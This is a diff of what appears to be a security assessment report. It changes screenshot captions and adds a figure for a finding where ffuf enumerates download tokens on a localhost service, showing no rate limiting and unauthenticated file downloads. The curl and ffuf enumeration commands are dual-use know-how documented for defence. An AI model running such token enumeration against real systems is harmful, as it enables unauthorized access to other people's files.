@@ -64,7 +64,7 @@ echo $TOKEN
 curl -si http://localhost:8000/download/$TOKEN
 ```
 
-**Observed Terminal Output (Screenshot: T-1):**
+**Observed Terminal Output:**
 
 ```
 HTTP/1.1 200 OK
@@ -128,7 +128,7 @@ ffuf -u http://localhost:8000/download/FUZZ \
      -t 10
 ```
 
-**Observed Terminal Output (Screenshot: T-1):**
+**Observed Terminal Output:**
 
 ```
 :: Method      : GET
@@ -143,6 +143,8 @@ ffuf -u http://localhost:8000/download/FUZZ \
 
 :: Progress: [501/501] :: Job [1/1] :: 549 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
 ```
+
+![Figure 1. ffuf token enumeration and unauthenticated download](screenshots/T-1_IDOR_ffuf_enumeration.png)
 
 **Analysis:** ffuf processed 501 requests at **549 requests/second** in **1 second** with zero errors and zero rate-limit responses (no HTTP 429 was ever returned). The valid token was identified in the wordlist and returned HTTP 200 with the file body. The `Errors: 0` line confirms the server never detected or throttled the scan. At this throughput, a targeted enumeration against a known file's token space is practical.
 
